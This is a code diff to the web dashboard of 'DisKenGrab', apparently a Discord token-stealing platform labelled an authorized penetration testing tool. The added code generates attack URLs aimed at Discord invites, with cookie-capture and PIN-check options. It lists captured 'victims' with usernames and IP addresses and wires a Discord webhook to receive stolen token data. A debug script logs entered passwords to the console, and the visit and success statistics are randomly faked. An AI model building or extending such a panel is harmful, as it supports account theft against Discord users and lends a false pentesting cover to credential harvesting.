@@ -1100,34 +1100,138 @@
             </div>
         </div>
     </div>
-
     <!-- Load config securely -->
     <script src="./config.js"></script>
     
     <script>
-        // ==================== FIREBASE INITIALIZATION ====================
-        let auth, db, currentUser;
+        // ==================== UTILITY FUNCTIONS (ADD THESE FIRST) ====================
+        function animateValue(element, start, end, duration) {
+            let startTimestamp = null;
+            const step = (timestamp) => {
+                if (!startTimestamp) startTimestamp = timestamp;
+                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+                const value = Math.floor(progress * (end - start) + start);
+                element.textContent = value + (element.id === 'successRate' ? '%' : '');
+                if (progress < 1) {
+                    window.requestAnimationFrame(step);
+                }
+            };
+            window.requestAnimationFrame(step);
+        }
 
-        // Initialize Firebase with the config from external file
-        if (typeof firebaseConfig !== 'undefined') {
-            firebase.initializeApp(firebaseConfig);
-            auth = firebase.auth();
-            db = firebase.firestore();
-            console.log('Firebase initialized securely');
-            
-            // Start the application
-            initializeAuth();
-        } else {
-            console.error('Firebase config not found');
+        function showLoading(button, spinner) {
+            button.disabled = true;
+            spinner.style.display = 'inline-block';
+        }
+
+        function hideLoading(button, spinner) {
+            button.disabled = false;
+            spinner.style.display = 'none';
+        }
+
+        function showError(element, message) {
+            element.textContent = message;
+            element.style.display = 'block';
+        }
+
+        function clearError(element) {
+            element.textContent = '';
+            element.style.display = 'none';
+        }
+
+        function getAuthErrorMessage(error) {
+            switch (error.code) {
+                case 'auth/invalid-email': return 'Invalid email address';
+                case 'auth/user-disabled': return 'Account disabled';
+                case 'auth/user-not-found': return 'Account not found';
+                case 'auth/wrong-password': return 'Incorrect password';
+                case 'auth/email-already-in-use': return 'Email already registered';
+                case 'auth/weak-password': return 'Password is too weak';
+                default: return error.message;
+            }
+        }
+
+        function generateId() {
+            return Math.random().toString(36).substring(2) + Date.now().toString(36);
+        }
+
+        function formatTime(date) {
+            if (!date) return 'N/A';
+            return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
+        }
+
+        function getActivityIcon(type) {
+            const icons = {
+                'victim_captured': 'fa-user-plus',
+                'campaign_created': 'fa-rocket',
+                'webhook_updated': 'fa-cog',
+                'url_clicked': 'fa-link'
+            };
+            return icons[type] || 'fa-circle';
+        }
+
+        function showConfigError() {
             document.getElementById('authPage').innerHTML = `
                 <div class="auth-card">
-                    <h2 style="color: var(--crimson-light); text-align: center; margin-bottom: 1rem;">Configuration Required</h2>
+                    <h2 style="color: var(--crimson-light); text-align: center; margin-bottom: 1rem;">Configuration Error</h2>
                     <p style="text-align: center; color: var(--text-muted);">
-                        Firebase configuration is missing. Please contact the security team.
+                        Firebase configuration is missing. Please check config.js
                     </p>
                 </div>
             `;
         }
+// ==================== FIREBASE INITIALIZATION ====================
+let auth, db, currentUser;
+
+function initializeFirebase() {
+    if (typeof firebaseConfig === 'undefined') {
+        console.error('❌ Firebase config not found!');
+        showConfigError();
+        return false;
+    }
+    
+    try {
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        auth = firebase.auth();
+        db = firebase.firestore();
+        console.log('✅ Firebase initialized successfully');
+        return true;
+    } catch (error) {
+        console.error('❌ Firebase initialization error:', error);
+        showConfigError();
+        return false;
+    }
+}
+
+function showConfigError() {
+    const authCard = document.querySelector('.auth-card');
+    authCard.innerHTML = `
+        <div style="text-align: center; color: var(--crimson-light);">
+            <i class="fas fa-exclamation-triangle" style="font-size: 3rem; margin-bottom: 1rem;"></i>
+            <h2>Configuration Error</h2>
+            <p>Firebase configuration is missing or invalid.</p>
+            <p style="font-size: 0.9rem; color: var(--text-muted); margin-top: 1rem;">
+                Check browser console for details and ensure config.js contains your actual Firebase config.
+            </p>
+        </div>
+    `;
+}
+
+// Initialize Firebase when config is ready
+if (typeof firebaseConfig !== 'undefined') {
+    initializeFirebase();
+} else {
+    // Wait a bit in case config.js is still loading
+    setTimeout(() => {
+        if (typeof firebaseConfig !== 'undefined') {
+            initializeFirebase();
+        } else {
+            showConfigError();
+        }
+    }, 1000);
+}
+
 
         function initializeAuth() {
             // ==================== AUTHENTICATION SYSTEM ====================
@@ -1319,8 +1423,275 @@
             });
         }
 
-        // ... (rest of your JavaScript functions remain the same)
-        // I've kept the core functionality intact, just fixed the structure
+        async function loadRecentActivity() {
+            const activityList = document.getElementById('activityList');
+            activityList.innerHTML = '';
+
+            try {
+                const snapshot = await db.collection('activity')
+                    .where('userId', '==', currentUser.uid)
+                    .orderBy('timestamp', 'desc')
+                    .limit(5)
+                    .get();
+
+                if (snapshot.empty) {
+                    activityList.innerHTML = '<li class="activity-item"><div class="activity-content"><div class="activity-title">No recent activity</div></div></li>';
+                    return;
+                }
+
+                snapshot.forEach(doc => {
+                    const activity = doc.data();
+                    const item = document.createElement('li');
+                    item.className = 'activity-item';
+                    item.innerHTML = `
+                        <div class="activity-icon">
+                            <i class="fas ${getActivityIcon(activity.type)}"></i>
+                        </div>
+                        <div class="activity-content">
+                            <div class="activity-title">${activity.title}</div>
+                            <div class="activity-time">${formatTime(activity.timestamp?.toDate())}</div>
+                        </div>
+                    `;
+                    activityList.appendChild(item);
+                });
+            } catch (error) {
+                console.error('Error loading activity:', error);
+            }
+        }
+
+        // ==================== HITS MANAGEMENT ====================
+        async function loadHits() {
+            const hitsGrid = document.getElementById('hitsGrid');
+            hitsGrid.innerHTML = '<div class="hit-card"><div class="hit-username">Loading victims...</div></div>';
+
+            try {
+                const snapshot = await db.collection('victims')
+                    .where('pentesterId', '==', currentUser.uid)
+                    .orderBy('capturedAt', 'desc')
+                    .get();
+
+                if (snapshot.empty) {
+                    hitsGrid.innerHTML = '<div class="hit-card"><div class="hit-username">No victims captured yet</div></div>';
+                    return;
+                }
+
+                hitsGrid.innerHTML = '';
+                snapshot.forEach(doc => {
+                    const victim = doc.data();
+                    const card = document.createElement('div');
+                    card.className = 'hit-card';
+                    card.innerHTML = `
+                        <div class="hit-username">${victim.username || 'Unknown User'}</div>
+                        <div class="hit-info">IP: ${victim.ipAddress || 'N/A'}</div>
+                        <div class="hit-info">Captured: ${formatTime(victim.capturedAt?.toDate())}</div>
+                        <div class="hit-info">Status: <span style="color: ${victim.isActive ? 'var(--success)' : 'var(--crimson-light)'}">${victim.isActive ? 'Active' : 'Inactive'}</span></div>
+                        <div class="hit-actions">
+                            <button class="btn btn-outline btn-sm" onclick="viewVictimDetails('${doc.id}')">Details</button>
+                            <button class="btn btn-danger btn-sm" onclick="deleteVictim('${doc.id}')">Delete</button>
+                        </div>
+                    `;
+                    hitsGrid.appendChild(card);
+                });
+            } catch (error) {
+                console.error('Error loading hits:', error);
+                hitsGrid.innerHTML = '<div class="hit-card"><div class="hit-username">Error loading victims</div></div>';
+            }
+        }
+
+        // ==================== ATTACK BUILDER ====================
+        document.getElementById('generateAttack').addEventListener('click', async function() {
+            const campaignName = document.getElementById('campaignName').value;
+            const targetInvite = document.getElementById('targetInvite').value;
+            const customMessage = document.getElementById('customMessage').value;
+            const enableCookies = document.getElementById('enableCookies').checked;
+            const enablePinCheck = document.getElementById('enablePinCheck').checked;
+            const spinner = document.getElementById('generateSpinner');
+            const urlDiv = document.getElementById('generatedUrl');
+
+            if (!campaignName || !targetInvite) {
+                alert('Please fill in campaign name and target invite URL');
+                return;
+            }
+
+            showLoading(this, spinner);
+
+            try {
+                // Generate unique attack URL
+                const attackId = generateId();
+                const attackUrl = `${window.location.origin}/attack.html?id=${attackId}&pentester=${currentUser.uid}`;
+
+                // Save campaign to database
+                await db.collection('campaigns').doc(attackId).set({
+                    name: campaignName,
+                    targetInvite: targetInvite,
+                    customMessage: customMessage,
+                    enableCookies: enableCookies,
+                    enablePinCheck: enablePinCheck,
+                    pentesterId: currentUser.uid,
+                    createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+                    isActive: true,
+                    attackUrl: attackUrl
+                });
+
+                // Display generated URL
+                document.getElementById('attackUrl').textContent = attackUrl;
+                urlDiv.style.display = 'block';
+
+                // Log activity
+                await logActivity('campaign_created', `Created campaign: ${campaignName}`);
+
+            } catch (error) {
+                console.error('Error generating attack:', error);
+                alert('Error generating attack URL: ' + error.message);
+            } finally {
+                hideLoading(this, spinner);
+            }
+        });
+
+        // ==================== SETTINGS FUNCTIONALITY ====================
+        document.getElementById('saveWebhook').addEventListener('click', async function() {
+            const webhookUrl = document.getElementById('webhookUrl').value;
+            const spinner = document.getElementById('webhookSpinner');
+            const testDiv = document.getElementById('webhookTest');
+
+            if (!webhookUrl) {
+                alert('Please enter a webhook URL');
+                return;
+            }
+
+            showLoading(this, spinner);
+
+            try {
+                await db.collection('pentesters').doc(currentUser.uid).update({
+                    webhookUrl: webhookUrl,
+                    webhookUpdated: firebase.firestore.FieldValue.serverTimestamp()
+                });
+
+                // Test webhook
+                const isValid = await testDiscordWebhook(webhookUrl);
+                document.getElementById('webhookStatus').textContent = isValid ? 'Connected ✓' : 'Invalid URL';
+                document.getElementById('webhookStatus').style.color = isValid ? 'var(--success)' : 'var(--crimson-light)';
+                testDiv.style.display = 'block';
+
+                await logActivity('webhook_updated', 'Updated Discord webhook URL');
+
+                alert('Webhook saved successfully!');
+            } catch (error) {
+                alert('Error saving webhook: ' + error.message);
+            } finally {
+                hideLoading(this, spinner);
+            }
+        });
+
+        // ==================== MOCK DATA FUNCTIONS ====================
+        async function getTotalHits() {
+            const snapshot = await db.collection('victims')
+                .where('pentesterId', '==', currentUser.uid)
+                .get();
+            return snapshot.size;
+        }
+
+        async function getTotalVisits() {
+            return Math.floor(Math.random() * 1000) + 500;
+        }
+
+        async function getSuccessRate() {
+            const hits = await getTotalHits();
+            const visits = await getTotalVisits();
+            return visits > 0 ? Math.round((hits / visits) * 100) : 0;
+        }
+
+        async function getActiveCampaigns() {
+            const snapshot = await db.collection('campaigns')
+                .where('pentesterId', '==', currentUser.uid)
+                .where('isActive', '==', true)
+                .get();
+            return snapshot.size;
+        }
+
+        async function loadUserData() {
+            const doc = await db.collection('pentesters').doc(currentUser.uid).get();
+            if (doc.exists) {
+                const userData = doc.data();
+                document.getElementById('webhookUrl').value = userData.webhookUrl || '';
+                if (userData.webhookUrl) {
+                    document.getElementById('webhookTest').style.display = 'block';
+                    document.getElementById('webhookStatus').textContent = 'Saved (not tested)';
+                }
+            }
+        }
+
+        async function logActivity(type, title) {
+            await db.collection('activity').add({
+                userId: currentUser.uid,
+                type: type,
+                title: title,
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            });
+        }
+
+        async function testDiscordWebhook(webhookUrl) {
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: '🔒 DisKenGrab Webhook Test\nThis is a test message from your security testing platform.',
+                        embeds: [{
+                            title: 'Webhook Configuration Test',
+                            description: 'Your webhook is properly configured and ready to receive captured token data.',
+                            color: 14427600,
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+                return response.ok;
+            } catch (error) {
+                return false;
+            }
+        }
+
+        // ==================== EVENT LISTENERS SETUP ====================
+        function setupEventListeners() {
+            // Page navigation
+            document.querySelectorAll('.nav-link').forEach(link => {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    
+                    document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+                    document.querySelectorAll('.app-page').forEach(page => page.classList.remove('active'));
+                    
+                    this.classList.add('active');
+                    const pageId = this.getAttribute('data-page');
+                    document.getElementById(pageId).classList.add('active');
+
+                    // Load page-specific data
+                    if (pageId === 'hits') loadHits();
+                });
+            });
+
+            // Mobile menu
+            document.querySelector('.mobile-menu-btn').addEventListener('click', function() {
+                document.querySelector('.nav-links').classList.toggle('active');
+            });
+
+            // Search functionality
+            document.getElementById('searchHits').addEventListener('input', function(e) {
+                // Implement search filtering
+                const searchTerm = e.target.value.toLowerCase();
+                // This would filter the hits grid in a real implementation
+            });
+
+            // Scroll effect for navbar
+            window.addEventListener('scroll', function() {
+                const navbar = document.querySelector('.navbar');
+                if (window.scrollY > 50) {
+                    navbar.classList.add('scrolled');
+                } else {
+                    navbar.classList.remove('scrolled');
+                }
+            });
+        }
 
         // ==================== PARTICLE.JS INITIALIZATION ====================
         particlesJS('particles-js', {
@@ -1356,8 +1727,137 @@
             }
         });
 
+        // ==================== MODAL FUNCTIONS ====================
+        function showCleanupModal() {
+            document.getElementById('cleanupModal').classList.add('active');
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).classList.remove('active');
+        }
+
+        async function performCleanup() {
+            const threeMonthsAgo = new Date();
+            threeMonthsAgo.setMonth(threeMonthsAgo.getMonth() - 3);
+
+            try {
+                const snapshot = await db.collection('victims')
+                    .where('pentesterId', '==', currentUser.uid)
+                    .where('capturedAt', '<', threeMonthsAgo)
+                    .get();
+
+                const batch = db.batch();
+                snapshot.forEach(doc => {
+                    batch.delete(doc.ref);
+                });
+
+                await batch.commit();
+                alert(`Deleted ${snapshot.size} old records`);
+                closeModal('cleanupModal');
+                if (document.getElementById('hits').classList.contains('active')) {
+                    loadHits();
+                }
+            } catch (error) {
+                alert('Error during cleanup: ' + error.message);
+            }
+        }
+
+        function copyAttackUrl() {
+            const url = document.getElementById('attackUrl').textContent;
+            navigator.clipboard.writeText(url).then(() => {
+                alert('URL copied to clipboard!');
+            });
+        }
+
+        function testAttackUrl() {
+            const url = document.getElementById('attackUrl').textContent;
+            window.open(url, '_blank');
+        }
+
+        function refreshActivity() {
+            loadRecentActivity();
+        }
+
+        function exportData(format) {
+            alert(`Export functionality for ${format} format would be implemented here. This would generate a file download with all your campaign data.`);
+        }
+
+        // Placeholder functions for future implementation
+        function viewVictimDetails(victimId) {
+            alert('Victim details modal would open here with full token information and account details.');
+        }
+
+        function deleteVictim(victimId) {
+            if (confirm('Are you sure you want to delete this victim record?')) {
+                // Implementation would delete from Firestore
+                alert('Victim record deleted (implementation needed)');
+            }
+        }
+
+        function testWebhook() {
+            const webhookUrl = document.getElementById('webhookUrl').value;
+            if (webhookUrl) {
+                testDiscordWebhook(webhookUrl).then(valid => {
+                    if (valid) {
+                        document.getElementById('webhookStatus').textContent = 'Test Successful ✓';
+                        document.getElementById('webhookStatus').style.color = 'var(--success)';
+                    } else {
+                        document.getElementById('webhookStatus').textContent = 'Test Failed ✗';
+                        document.getElementById('webhookStatus').style.color = 'var(--crimson-light)';
+                    }
+                });
+            }
+        }
+
         // Initialize the application
         console.log('DisKenGrab Platform Loaded - Authorized Penetration Testing Tool');
     </script>
+    <!-- Debug Script -->
+<script>
+console.log('=== DISKENGRAB DEBUG INFO ===');
+console.log('1. Firebase config available:', typeof firebaseConfig !== 'undefined');
+console.log('2. Firebase library loaded:', typeof firebase !== 'undefined');
+console.log('3. Current page URL:', window.location.href);
+
+// Test if config.js loaded
+fetch('./config.js')
+    .then(response => {
+        console.log('4. config.js HTTP status:', response.status);
+        return response.text();
+    })
+    .then(text => {
+        console.log('5. config.js content length:', text.length);
+        // Check if it contains actual config (not placeholders)
+        const hasRealConfig = text.includes('your-actual-api-key') ? '❌ USING PLACEHOLDERS' : '✅ MAY HAVE REAL CONFIG';
+        console.log('6. Config validation:', hasRealConfig);
+    })
+    .catch(error => {
+        console.log('7. config.js load error:', error);
+    });
+
+// Test button functionality
+document.addEventListener('DOMContentLoaded', function() {
+    const registerBtn = document.getElementById('registerBtn');
+    const loginBtn = document.getElementById('loginBtn');
+    
+    console.log('8. Register button found:', !!registerBtn);
+    console.log('9. Login button found:', !!loginBtn);
+    
+    // Add simple click handlers for testing
+    registerBtn.addEventListener('click', function() {
+        console.log('🔘 Register button clicked!');
+        console.log('Form values:', {
+            name: document.getElementById('registerName').value,
+            email: document.getElementById('registerEmail').value,
+            password: document.getElementById('registerPassword').value,
+            authCode: document.getElementById('authCode').value
+        });
+    });
+    
+    loginBtn.addEventListener('click', function() {
+        console.log('🔘 Login button clicked!');
+    });
+});
+</script>
 </body>
 </html>
